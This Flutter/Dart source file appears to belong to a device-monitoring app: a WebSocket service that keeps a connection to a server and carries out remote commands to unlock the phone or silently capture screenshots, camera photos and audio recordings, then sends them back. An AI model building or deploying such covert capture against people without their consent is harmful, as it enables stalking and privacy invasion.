import 'dart:async';
import 'dart:convert';
import 'package:flutter/foundation.dart';
import 'package:monitored_app/core/services/data_collector_service.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:web_socket_channel/io.dart';
import 'package:monitored_app/app/constants.dart';
import 'package:monitored_app/core/services/storage_service.dart';
import 'package:monitored_app/core/utils/device_utils.dart';
import 'package:monitored_app/core/services/unlock_service.dart';
import 'package:monitored_app/app/locator.dart';

class WebSocketService {
  WebSocketChannel? _channel;
  StreamSubscription? _subscription;
  final StorageService _storageService = locator<StorageService>();
  final UnlockService _unlockService = locator<UnlockService>();

  Timer? _reconnectTimer;
  Timer? _heartbeatTimer;
  bool _isConnected = false;
  int _reconnectAttempts = 0;

  // Singleton pattern
  static final WebSocketService _instance = WebSocketService._internal();

  factory WebSocketService() {
    return _instance;
  }

  WebSocketService._internal();

  bool get isConnected => _isConnected;

  Future<void> connect() async {
    if (_channel != null) {
      await disconnect();
    }

    try {
      final token = await _storageService.read(AppConstants.tokenKey);
      final deviceId = await DeviceUtils.getDeviceIdentifier();

      if (token == null || deviceId.isEmpty) {
        debugPrint('WebSocket: No token or device ID found');
        return;
      }

      final uri = Uri.parse(
          '${AppConstants.wsBaseUrl}/ws/device/$deviceId/?token=$token');

      _channel = IOWebSocketChannel.connect(
        uri,
        pingInterval: const Duration(seconds: 30),
      );

      _subscription = _channel!.stream.listen(
        _onMessage,
        onError: _onError,
        onDone: _onDone,
      );

      _isConnected = true;
      _reconnectAttempts = 0;

      // Start sending heartbeats
      _startHeartbeat();

      debugPrint('WebSocket: Connected');
    } catch (e) {
      debugPrint('WebSocket connection error: $e');
      _scheduleReconnect();
    }
  }

  Future<void> disconnect() async {
    _stopHeartbeat();
    _cancelReconnect();

    if (_subscription != null) {
      await _subscription!.cancel();
      _subscription = null;
    }

    if (_channel != null) {
      await _channel!.sink.close();
      _channel = null;
    }

    _isConnected = false;
    debugPrint('WebSocket: Disconnected');
  }

  void _onMessage(dynamic message) {
    try {
      final data = jsonDecode(message);
      final messageType = data['type'];

      debugPrint('WebSocket: Received message type: $messageType');

      switch (messageType) {
        case 'device_command':
          _handleCommand(data);
          break;
        case 'device_status':
          // Handle status update if needed
          break;
        default:
          debugPrint('WebSocket: Unknown message type: $messageType');
      }
    } catch (e) {
      debugPrint('WebSocket: Error processing message: $e');
    }
  }

  void _handleUnlockCommand(Map<String, dynamic> data) async {
    final senderId = data['sender_id'];
    debugPrint('WebSocket: Unlock command received from: $senderId');

    bool success = false;
    String message = '';

    try {
      success = await _unlockService.unlockDevice();
      message =
          success ? 'Device unlocked successfully' : 'Failed to unlock device';
    } catch (e) {
      message = 'Error unlocking device: $e';
    }

    // Send response back
    _sendMessage({
      'type': 'unlock_response',
      'success': success,
      'message': message,
    });
  }

  void _sendMessage(Map<String, dynamic> message) {
    if (_channel != null && _isConnected) {
      _channel!.sink.add(jsonEncode(message));
    }
  }

  void _onError(error) {
    debugPrint('WebSocket error: $error');
    _isConnected = false;
    _scheduleReconnect();
  }

  void _onDone() {
    debugPrint('WebSocket done');
    _isConnected = false;
    _scheduleReconnect();
  }

  void _scheduleReconnect() {
    _cancelReconnect();

    // Exponential backoff for reconnection attempts
    final delay = _calculateReconnectDelay();

    debugPrint('WebSocket: Scheduling reconnect in ${delay.inSeconds} seconds');

    _reconnectTimer = Timer(delay, () {
      connect();
    });
  }

  Duration _calculateReconnectDelay() {
    // Exponential backoff with maximum delay of 1 minute
    _reconnectAttempts++;
    final seconds =
        _reconnectAttempts > 6 ? 60 : (1 << _reconnectAttempts); // 2^n seconds
    return Duration(seconds: seconds);
  }

  void _cancelReconnect() {
    if (_reconnectTimer != null) {
      _reconnectTimer!.cancel();
      _reconnectTimer = null;
    }
  }

  void _startHeartbeat() {
    _stopHeartbeat();

    _heartbeatTimer = Timer.periodic(const Duration(seconds: 30), (timer) {
      if (_isConnected) {
        _sendMessage({
          'type': 'heartbeat',
          'timestamp': DateTime.now().toIso8601String(),
        });
      }
    });
  }

  void _stopHeartbeat() {
    if (_heartbeatTimer != null) {
      _heartbeatTimer!.cancel();
      _heartbeatTimer = null;
    }
  }

  // Send a status update to the server (battery, online status, etc.)
  void sendStatusUpdate({
    required int batteryLevel,
    required bool isCharging,
  }) {
    if (!_isConnected) return;

    _sendMessage({
      'type': 'status_update',
      'status': 'active',
      'battery': batteryLevel,
      'is_charging': isCharging,
      'timestamp': DateTime.now().toIso8601String(),
    });
  }

  void _handleCommand(Map<String, dynamic> data) {
    final command = data['command'];

    switch (command) {
      case 'unlock_device':
        _handleUnlockCommand(data);
        break;
      case 'capture_media':
        _handleCaptureMediaCommand(data);
        break;
      default:
        debugPrint('WebSocket: Unknown command: $command');
    }
  }

  void _handleCaptureMediaCommand(Map<String, dynamic> data) async {
    final mediaType = data['media_type']; // 'screenshot', 'photo', 'audio'
    final senderId = data['sender_id'];
    final commandId = data['command_id'];

    debugPrint(
        'WebSocket: Media capture command received: $mediaType from: $senderId');

    bool success = false;
    String message = '';
    Map<String, dynamic>? mediaData;

    try {
      // Get reference to the MediaCollector
      final mediaCollector = locator<DataCollectorService>().mediaCollector;

      // Execute the appropriate capture method
      switch (mediaType) {
        case 'screenshot':
          mediaData = await mediaCollector.captureScreenshot();
          break;
        case 'photo':
          final useFrontCamera = data['front_camera'] ?? false;
          mediaData =
              await mediaCollector.capturePhoto(frontCamera: useFrontCamera);
          break;
        case 'audio':
          final duration = data['duration_seconds'] ?? 30;
          mediaData =
              await mediaCollector.recordAudio(durationSeconds: duration);
          break;
      }

      success = mediaData != null;
      message =
          success ? 'Media captured successfully' : 'Failed to capture media';
    } catch (e) {
      message = 'Error capturing media: $e';
    }

    // Send response back
    _sendMessage({
      'type': 'media_capture_response',
      'success': success,
      'message': message,
      'command_id': commandId,
      'media_data': mediaData,
    });
  }
}
